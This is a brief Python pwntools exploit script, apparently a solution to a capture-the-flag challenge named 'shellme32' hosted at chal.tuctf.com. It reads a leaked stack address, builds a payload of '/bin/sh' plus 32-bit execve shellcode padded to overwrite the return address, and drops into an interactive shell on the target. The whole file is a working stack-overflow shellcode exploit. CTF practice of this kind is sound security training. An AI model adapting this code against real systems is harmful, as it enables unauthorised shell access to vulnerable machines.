from pwn import *

e = ELF("./shellme32")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("chal.tuctf.com", 30506)
else:
  p = process(e.path)

p.recvuntil("0x")
leak = int(p.recvline(), 16)
print("{:#x}".format(leak))

pay = (("/bin/sh\x00" + asm("""
  mov ebx, """ + hex(leak) + """
  xor ecx, ecx
  xor edx, edx
  push SYS_execve
  pop eax
  int 0x80
""")).ljust(40) + p32(leak + 8))


p.sendlineafter(">", pay)

p.interactive()
